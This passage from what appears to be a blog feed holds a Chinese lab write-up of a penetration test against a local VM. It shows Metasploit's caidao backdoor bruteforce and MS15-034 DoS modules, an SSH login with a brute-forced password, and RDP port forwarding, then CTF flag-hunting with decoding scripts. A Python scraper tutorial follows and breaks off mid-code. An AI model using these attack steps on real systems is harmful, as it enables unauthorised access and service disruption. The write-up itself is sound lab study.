class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; help</span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    ?                         Help menu</span><br><span class="line">    background                Backgrounds the current session</span><br><span class="line">    bg                        Alias for background</span><br><span class="line">    bgkill                    Kills a background meterpreter script</span><br><span class="line">    bglist                    Lists running background scripts</span><br><span class="line">    bgrun                     Executes a meterpreter script as a background thread</span><br><span class="line">    channel                   Displays information or control active channels</span><br><span class="line">    close                     Closes a channel</span><br><span class="line">    detach                    Detach the meterpreter session (for http/https)</span><br><span class="line">    disable_unicode_encoding  Disables encoding of unicode strings</span><br><span class="line">    enable_unicode_encoding   Enables encoding of unicode strings</span><br><span class="line">    exit                      Terminate the meterpreter session</span><br><span class="line">    guid                      Get the session GUID</span><br><span class="line">    help                      Help menu</span><br><span class="line">    info                      Displays information about a Post module</span><br><span class="line">    irb                       Open an interactive Ruby shell on the current session</span><br><span class="line">    load                      Load one or more meterpreter extensions</span><br><span class="line">    machine_id                Get the MSF ID of the machine attached to the session</span><br><span class="line">    pry                       Open the Pry debugger on the current session</span><br><span class="line">    quit                      Terminate the meterpreter session</span><br><span class="line">    read                      Reads data from a channel</span><br><span class="line">    resource                  Run the commands stored in a file</span><br><span class="line">    run                       Executes a meterpreter script or Post module</span><br><span class="line">    secure                    (Re)Negotiate TLV packet encryption on the session</span><br><span class="line">    sessions                  Quickly switch to another session</span><br><span class="line">    use                       Deprecated alias for &quot;load&quot;</span><br><span class="line">    uuid                      Get the UUID for the current session</span><br><span class="line">    write                     Writes data to a channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: File system Commands</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    cat           Read the contents of a file to the screen</span><br><span class="line">    download      Download a file or directory</span><br><span class="line">    edit          Edit a file</span><br><span class="line">    getlwd        Print local working directory</span><br><span class="line">    lcd           Change local working directory</span><br><span class="line">    lls           List local files</span><br><span class="line">    lpwd          Print local working directory</span><br><span class="line">    upload        Upload a file or directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Networking Commands</span><br><span class="line">===========================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    portfwd       Forward a local port to a remote service</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Audio Output Commands</span><br><span class="line">=============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    play          play a waveform audio file (.wav) on the target system</span><br></pre></td></tr></table></figure><h2 id="（2）ssh测试"><a class="header-anchor" href="#（2）ssh测试">¶</a>（2）ssh测试</h2><ol><li><p>首先，通过hydra进行密码爆破，得到Administrator账号密码：admin321，即可建立ssh链接。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(root💀kali)-[~]</span><br><span class="line">└─$ ssh Administrator@10.0.2.4</span><br><span class="line">Administrator@10.0.2.4&#x27;s password: </span><br><span class="line">-sh-4.3$ </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>检测3389端口，发现端口是打开的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(root💀kali)-[~]</span><br><span class="line">└─$ nmap -p 3389 10.0.2.4                                                                     </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-17 01:57 EST</span><br><span class="line">Nmap scan report for 10.0.2.4</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">3389/tcp filtered ms-wbt-server</span><br><span class="line">MAC Address: 08:00:27:0B:0C:01 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds</span><br></pre></td></tr></table></figure></li><li><p>端口转发，并进行连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(root💀kali)-[~]</span><br><span class="line">└─$ ssh -L 3389:localhost:3389 Administrator@10.0.2.4</span><br><span class="line">Administrator@10.0.2.4&#x27;s password: </span><br><span class="line">Last login: Thu Dec 16 22:54:07 2021 from 10.0.2.15</span><br><span class="line">-sh-4.3$ </span><br><span class="line">(kali㉿kali)-[~]</span><br><span class="line">└─$ rdesktop 127.0.0.1:3389</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/17/QcGxjgtXmf9631H.png" alt="desktop"></p></li><li><p>实现可以直接在kali攻击机上进行对靶机的操作</p></li></ol><p>（3）caidao</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search caidao</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                            Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                            ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/multi/http/caidao_php_backdoor_exec     2015-10-27       excellent  Yes    China Chopper Caidao PHP Backdoor Code Execution</span><br><span class="line">   1  auxiliary/scanner/http/caidao_bruteforce_login                   normal     No     Chinese Caidao Backdoor Bruteforce</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/caidao_bruteforce_login                                                                                                        </span><br><span class="line"></span><br><span class="line">msf6 &gt; use auxiliary/scanner/http/caidao_bruteforce_login</span><br><span class="line">msf6 auxiliary(scanner/http/caidao_bruteforce_login) &gt; set RHOSTS 10.0.2.4</span><br><span class="line">RHOSTS =&gt; 10.0.2.4</span><br><span class="line">msf6 auxiliary(scanner/http/caidao_bruteforce_login) &gt; set TARGETURI /caidao.asp</span><br><span class="line">TARGETURI =&gt; /caidao.asp</span><br><span class="line">msf6 auxiliary(scanner/http/caidao_bruteforce_login) &gt; run</span><br><span class="line"></span><br><span class="line">[-] 10.0.2.4:80 - Failed: &#x27;admin&#x27;</span><br><span class="line">[-] 10.0.2.4:80 - Failed: &#x27;123456&#x27;</span><br><span class="line">[-] 10.0.2.4:80 - Failed: &#x27;12345&#x27;</span><br><span class="line">[-] 10.0.2.4:80 - Failed: &#x27;123456789&#x27;</span><br><span class="line">[+] 10.0.2.4:80 - Success: &#x27;password&#x27;</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>找到连接口令：‘password’</p><h2 id="（4）80端口–http"><a class="header-anchor" href="#（4）80端口–http">¶</a>（4）80端口–http</h2><p>MS15-034/CVE-2015-1635 HTTP远程代码执行漏洞（远程蓝屏代码）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ms15_034</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                                  Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -  ----                                                  ---------------  ----    -----  -----------</span><br><span class="line">   0  auxiliary/dos/http/ms15_034_ulonglongadd                               normal  Yes    MS15-034 HTTP Protocol Stack Request Handling Denial-of-Service</span><br><span class="line">   1  auxiliary/scanner/http/ms15_034_http_sys_memory_dump                   normal  Yes    MS15-034 HTTP Protocol Stack Request Handling HTTP.SYS Memory Information Disclosure</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/ms15_034_http_sys_memory_dump                                                                                                  </span><br><span class="line"></span><br><span class="line">msf6 &gt; use auxiliary/dos/http/ms15_034_ulonglongadd </span><br><span class="line">msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; set RHOSTS 10.0.2.4</span><br><span class="line">RHOSTS =&gt; 10.0.2.4</span><br><span class="line">msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/dos/http/ms15_034_ulonglongadd):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS     10.0.2.4         yes       The target host(s), see https://github.com/rapid7/metasploit-framewor</span><br><span class="line">                                         k/wiki/Using-Metasploit</span><br><span class="line">   RPORT      80               yes       The target port (TCP)</span><br><span class="line">   SSL        false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI  /                no        URI to the site (e.g /site/) or a valid file resource (e.g /welcome.p</span><br><span class="line">                                         ng)</span><br><span class="line">   THREADS    1                yes       The number of concurrent threads (max one per host)</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; run</span><br><span class="line"></span><br><span class="line">[*] DOS request sent</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; run</span><br></pre></td></tr></table></figure><p>结果靶机没有蓝屏，而是立即重启了，也蛮有趣的</p><h1>三、后渗透阶段（flag挖掘）</h1><p>很像是在打CTF，做得蛮开心的~</p><h2 id="1-the-joker"><a class="header-anchor" href="#1-the-joker">¶</a>1. the_joker</h2><ol><li><p>发现80端口是打开的，用浏览器打开，不难从html页面发现隐藏的HEX代码，通过<code>curl http://10.0.2.4/ &gt; data.html cat data.html | perl -ne 'print $1 if(/value\=\&quot;(\w+)\&quot;\&gt;/g)' &gt; data.hex</code> 获得hex.txt见附件</p></li><li><p>不难猜想可由hex转图片，<a href="http://xn--hex2png-lr4kf0uz1a093n.py">于是写出hex2png.py</a>，获得flag。</p></li><li><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;hex.txt&#x27;</span>) <span class="keyword">as</span> f, <span class="built_in">open</span>(<span class="string">&#x27;data.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> fout:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        fout.write(binascii.unhexlify(line))</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2021/12/17/21KMvxdUwutezon.png" alt="joker"></p><h2 id="2-Ace-of-Hearts"><a class="header-anchor" href="#2-Ace-of-Hearts">¶</a>2. Ace_of_Hearts</h2><ol><li>打开目录不难找到一张普通的红桃A，文件异常之大，不难发现端倪，可能是多文件隐藏。</li><li>查看二进制格式，把第一个jpg文件删去，即得到flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/nMzVcvW26uNOpyC.png" alt="ace_of_hearts"></p><h2 id="3-Jack-of-Hearts"><a class="header-anchor" href="#3-Jack-of-Hearts">¶</a>3.  Jack_of_Hearts</h2><ol><li><p>不难在document目录下发现Jack_of_Hearts.docx，考虑单文件docx中的PNG隐藏文件</p></li><li><p>将docx文件后缀改为.zip就会得到一个压缩文件，在\word\media中就能找到隐藏的图像flag文件）</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/kmhuVc8ApNgj3yM.png" alt="jack_of_hearts"></p><h2 id="4-Six-of-Diamonds"><a class="header-anchor" href="#4-Six-of-Diamonds">¶</a>4. Six_of_Diamonds</h2><ol><li>在C:\inetpub\wwwroot目录下不难找到six_of_diamonds压缩包，发现经过加密</li><li>首先考虑是不是伪加密，将全局方式位标记改为 00 00，未能成功打开，说明确实有密码</li><li>使用ARCHPR进行爆破，密码为vagrant，获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/MxJXZNs3TrvQhou.png" alt="six_of_diamonds"></p><h2 id="5-King-of-Diamonds"><a class="header-anchor" href="#5-King-of-Diamonds">¶</a>5. King_of_Diamonds</h2><p>在C:\wamp\www\wordpress\wp-content\uploads\2017\09目录下直接找到King_of_Diamonds.png</p><p><img src="https://s2.loli.net/2021/12/17/cZ3u2kmh9aUxvg4.png" alt="king_of_damonds"></p><h2 id="6-Three-of-Spades"><a class="header-anchor" href="#6-Three-of-Spades">¶</a>6. Three_of_Spades</h2><ol><li><p>此图片我一通好找，突然想起可能是被隐藏了，最终在C:\windows目录下找到了</p></li><li><p>但是仍然无法打开，二进制格式打开根据文件头猜测文件被处理过，对文件异或操作，获得正常png格式</p></li><li><p>处理图片的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">_<span class="keyword">in</span> = <span class="string">&#x27;three_of_spades.png&#x27;</span>;</span><br><span class="line">_out = _<span class="keyword">in</span> + <span class="string">&#x27;.out&#x27;</span>;</span><br><span class="line"></span><br><span class="line">b = <span class="built_in">bytearray</span>(<span class="built_in">open</span>(_<span class="keyword">in</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">    b[i] ^= <span class="number">0x0f</span></span><br><span class="line"><span class="built_in">open</span>(_out, <span class="string">&#x27;wb&#x27;</span>).write(b)</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2021/12/17/4yeYRt9ZzgNpn8W.png" alt="three_of_spades"></p><h2 id="7-Seven-of-Spades"><a class="header-anchor" href="#7-Seven-of-Spades">¶</a>7. Seven_of_Spades</h2><ol><li>在Libraries\Documents目录下发现Seven of Spades.pdf，不难想到是隐藏在文件里了，使用pdf-parser即可获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/gLJlobmzvewOQI1.png" alt="seven_of_spades"></p><h2 id="8-Four-of-Clubs"><a class="header-anchor" href="#8-Four-of-Clubs">¶</a>8. Four_of_Clubs</h2><ol><li>类似7，Libraries\Music目录下找到Four_of_Clubs.wav，使用binwalk分离其中的flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/PWTZSrDiycuUKgX.png" alt="four_of-clubs"></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cyber Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python爬虫笔记</title>
      <link href="/2021/10/22/Python%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/10/22/Python%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1>使用requests和bs4爬取新东方作文</h1><p>其实这是当时学爬虫的最初动力，爬点范文（doge）<br>技术路线的学习都记录在下面，深感博客杂乱不完整，试图整理了一遍。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fetchUrl</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    功能：访问 url 的网页，获取网页内容并返回</span></span><br><span class="line"><span class="string">    参数：目标网页的 url</span></span><br><span class="line"><span class="string">    返回：目标网页的 html 内容</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = requests.get(url, headers=headers)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getContent</span>(<span class="params">html</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    功能：解析 HTML 网页，获取新闻的文章内容</span></span><br><span class="line"><span class="string">    参数：html 网页内容</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    new_html = html.replace(<span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    bsobj = bs4.BeautifulSoup(new_html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    <span class="comment"># 获取文章 内容</span></span><br><span class="line">    temp = bsobj.find(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;style_stem-text__3Vgg5&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> temp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        text = temp.find(<span class="string">&#x27;p&#x27;</span>).get_text()</span><br><span class="line">        <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveFile</span>(<span class="params">content, path, filename</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    功能：将文章内容 content 保存到本地文件中</span></span><br><span class="line"><span class="string">    参数：要保存的内容，路径，文件名</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 如果没有该文件夹，则自动生成</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">        os.makedirs(path)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path + filename, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPageList</span>(<span class="params">pageUrl</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    功能：获取文章链接列表</span></span><br><span class="line"><span class="string">    参数：文章链接</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    html = fetchUrl(pageUrl)</span><br><span class="line">    bsobj = bs4.BeautifulSoup(html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    pageList = bsobj.find_all(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;style_question-item-content__zwx24&#x27;</span>&#125;)</span><br><span class="line">    linkList = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> pageList:</span><br><span class="line">        temp = page.find(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        link = temp[<span class="string">&quot;href&quot;</span>]</span><br><span class="line">        url = <span class="string">&quot;https://liuxue.koolearn.com&quot;</span> + link</span><br><span class="line">        linkList.append(url)</span><br><span class="line">    <span class="keyword">return</span> linkList</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_article</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    功能：爬取网页文章，并保存在 指定目录下</span></span><br><span class="line"><span class="string">    参数：文件保存的根目录</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    path = <span class="string">&quot;D:/TOEFL/Writing/&quot;</span></span><br><span class="line">    baseurl = <span class="string">&quot;https://liuxue.koolearn.com/toefl/write-0-&quot;</span></span><br><span class="line">    suffix = <span class="string">&quot;-0/&quot;</span></span><br><span class="line">    var = <span class="number">997</span></span><br><span class="line">    cnt = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> var &gt;= <span class="number">953</span>:</span><br><span class="line">        page_url = baseurl + <span class="built_in">str</span>(var) + suffix</span><br><span class="line">        articles = getPageList(page_url)</span><br><span class="line">        <span class="keyword">for</span> article <span class="keyword">in</span> articles:</span><br><span class="line">            <span class="comment"># 获取新闻文章内容</span></span><br><span class="line">            html = fetchUrl(article)</span><br><span class="line">            content = getContent(html)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> content <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="comment"># 生成文件名</span></span><br><span class="line">                fileName = <span class="built_in">str</span>(cnt) + <span class="string">&quot;.txt&quot;</span></span><br><span class="line">                saveFile(content, path, fileName)</span><br><span class="line">                cnt += <span class="number">1</span></span><br><span class="line">        var -= <span class="number">11</span></span><br><span class="line">    <span class="keyword">return</span> cnt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    cnt = download_article()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;all done!\n&quot;</span> + <span class="built_in">str</span>(cnt))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>基础知识：http协议与url</h1><h2 id="什么是http和https协议："><a class="header-anchor" href="#什么是http和https协议：">¶</a>什么是http和https协议：</h2><p>HTTP协议：全称是<code>HyperText Transfer Protocol</code>，中文意思是超文本传输协议，是一种发布和接收HTML页面的方法。服务器端口号是<code>80</code>端口。<br>HTTPS协议：是HTTP协议的加密版本，在HTTP下加入了SSL层。服务器端口号是<code>443</code>端口。</p><p>在浏览器中发送一个http请求的过程：</p><ol><li>当用户在浏览器的地址栏中输入一个URL并按回车键之后，浏览器会向HTTP服务器发送HTTP请求。HTTP请求主要分为“Get”和“Post”两种方法。</li><li>当我们在浏览器输入URL <a href="http://www.baidu.com">http://www.baidu.com</a> 的时候，浏览器发送一个Request请求去获取 <a href="http://www.baidu.com">http://www.baidu.com</a> 的html文件，服务器把Response文件对象发送回给浏览器。</li><li>浏览器分析Response中的 HTML，发现其中引用了很多其他文件，比如Images文件，CSS文件，JS文件。 浏览器会自动再次发送Request去获取图片，CSS文件，或者JS文件。</li><li>当所有的文件都下载成功后，网页会根据HTML语法结构，完整的显示出来了。</li></ol><h2 id="url详解："><a class="header-anchor" href="#url详解：">¶</a>url详解：</h2><p><code>URL</code>是<code>Uniform Resource Locator</code>的简写，统一资源定位符。<br>一个<code>URL</code>由以下几部分组成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 